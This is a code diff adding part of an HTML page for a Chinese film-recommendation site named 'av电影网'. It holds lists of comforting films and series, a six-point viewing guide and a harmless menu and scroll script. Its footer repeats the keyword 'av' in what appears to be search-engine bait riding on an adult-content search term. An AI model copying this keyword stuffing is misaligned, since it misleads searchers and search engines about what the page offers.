+          <ol>
+            <li><b>《海边的曼彻斯特》</b>它拒绝说“会好的”，这恰恰是它的善意。<em>02:20</em></li>
+            <li><b>《小森林》</b>一个人吃饭，也可以很隆重。<em>00:42</em></li>
+            <li><b>《完美的日子》</b>扫厕所的东京大叔，把每一天过成作品。<em>00:38</em></li>
+            <li><b>《海蒂和爷爷》</b>阿尔卑斯山的风，能吹散很多事。<em>01:14</em></li>
+            <li><b>《小萝莉的猴神大叔》</b>跨越国境的善意，简单、直接、有效。<em>02:40</em></li>
+            <li><b>《心灵奇旅》</b>“也许平淡的一天，才是火花。”<em>01:26</em></li>
+          </ol>
+        </details>
+        <details class="lst rv">
+          <summary><span class="ix">06</span><h3>剧集六选：适合一起追的那种</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《我的解放日志》</b>“今天，也辛苦了。”全剧最短、最重的一句。<em>15:06</em></li>
+            <li><b>《知否知否应是绿肥红瘦》</b>一个女孩如何在深宅里，长出自己的骨头。<em>22:14</em></li>
+            <li><b>《去有风的地方》</b>停下来，不是失败，是终于舍得对自己好一点。<em>08:30</em></li>
+            <li><b>《三十而已》</b>三个三十岁女人的上海，比剧本更敢写。<em>19:02</em></li>
+            <li><b>《俗女养成记》</b>“不结婚也可以。”台南的阿嬷，比心理医生管用。<em>11:48</em></li>
+            <li><b>《乘风破浪的姐姐》</b>三十岁之后，才真正开始为自己活。<em>05:20</em></li>
+          </ol>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <!-- ⑤ 观影指南 -->
+  <section id="guide" aria-labelledby="t5">
+    <div class="wrap">
+      <div class="sh rv">
+        <span class="no">SEC 05</span>
+        <div>
+          <div class="en">HOW TO USE · 观影指南</div>
+          <h2 id="t5">陪她看，不评价；陪自己看，不解释</h2>
+        </div>
+      </div>
+      <p class="lead">挑片不是 4000 个推荐，是一个<b>关系问题</b>。以下六条，帮你在算法失效的地方，找回自己的口味。</p>
+
+      <div class="guide">
+        <div class="gd rv"><span class="st">TAPE 01</span><h3>先问“她今天怎么了”</h3><p>别问类型，问状态。她今天是想哭、想笑、想安静，还是想逃？情绪才是入口，类型只是货架。</p><span class="no" aria-hidden="true">01</span></div>
+        <div class="gd rv"><span class="st">TAPE 02</span><h3>一起看，但不要“一起评判”</h3><p>看完别说“这片子拍得不行”。陪她看的意义，是给她一个安全的情绪出口，不是替她做影评。</p><span class="no" aria-hidden="true">02</span></div>
+        <div class="gd rv"><span class="st">TAPE 03</span><h3>允许她中途关掉</h3><p>一部电影前 20 分钟没抓住她，关掉不丢人。真正的浪费不是“没看完”，是“看完却什么也没留下”。</p><span class="no" aria-hidden="true">03</span></div>
+        <div class="gd rv"><span class="st">TAPE 04</span><h3>一次看完，别分段</h3><p>电影是被设计成“一口气”的。中间停下，等于自己给自己剧透情绪。97 分钟的片子，就给它 97 分钟。</p><span class="no" aria-hidden="true">04</span></div>
+        <div class="gd rv"><span class="st">TAPE 05</span><h3>看第二遍才算看过</h3><p>第一遍看剧情，第二遍看构图、对白、留白。好电影的第二遍，会给你一个完全不同的故事，和一个更懂她的自己。</p><span class="no" aria-hidden="true">05</span></div>
+        <div class="gd rv"><span class="st">TAPE 06</span><h3>一个人看，不丢人</h3><p>如果她不在身边，就一个人看。散场时的那种安静，是影院给你的最好的东西。看完，给她发一条消息：今天这部，让我想起你。</p><span class="no" aria-hidden="true">06</span></div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="foot">
+    <div class="f1">
+      <div class="flogo">
+        <span class="rib" aria-hidden="true"><i></i></span>
+        <span><b>av电影网</b><span class="en">SISTER · CINEMA</span></span>
+      </div>
+      <p style="margin-top:12px;max-width:42ch">av电影网，一个讲“av”的电影站。成长、姐妹、家庭、青春、治愈——用女性视角挑片、写影评、做片单。本站为影视资讯与观影指南站点，片源信息以各正版平台为准。</p>
+    </div>
+    <div>
+      <h4>栏目</h4>
+      <a href="#pick">今日片单</a>
+      <a href="#grow">成长阶段</a>
+      <a href="#note">深度影评</a>
+      <a href="#list">主题片单</a>
+      <a href="#guide">观影指南</a>
+    </div>
+    <div>
+      <h4>归档</h4>
+      <a href="#">姐妹</a>
+      <a href="#">成长</a>
+      <a href="#">母女</a>
+      <a href="#">青春</a>
+      <a href="#">治愈</a>
+    </div>
+    <div class="copy">
+      <span>© 2026 <span class="kw">av电影网</span> ｜ 网站网址：https://adianyingwang-cn.github.io</span>
+      <span>关键词：<span class="kw">av电影网</span>、av、姐妹、成长、青春、治愈、家庭、女性、华语电影、电影推荐、影评、片单</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var io = new IntersectionObserver(function(es){
+    es.forEach(function(e){
+      if(!e.isIntersecting) return;
+      e.target.classList.add('in');
+      io.unobserve(e.target);
+    });
+  }, {threshold:0.12, rootMargin:'0px 0px -40px'});
+
+  document.querySelectorAll('.rv').forEach(function(el){ io.observe(el); });
+
+  var mb = document.getElementById('mb'), nav = document.getElementById('nav');
+  mb.addEventListener('click', function(){
+    var o = nav.classList.toggle('open');
+    mb.setAttribute('aria-expanded', o ? 'true' : 'false');
+    document.body.classList.toggle('lock', o);
+  });
+  nav.addEventListener('click', function(e){
+    if(e.target.tagName === 'A'){
+      nav.classList.remove('open');
+      mb.setAttribute('aria-expanded','false');
+      document.body.classList.remove('lock');
+    }
+  });
+})();
+</script>
+</body>
+</html>
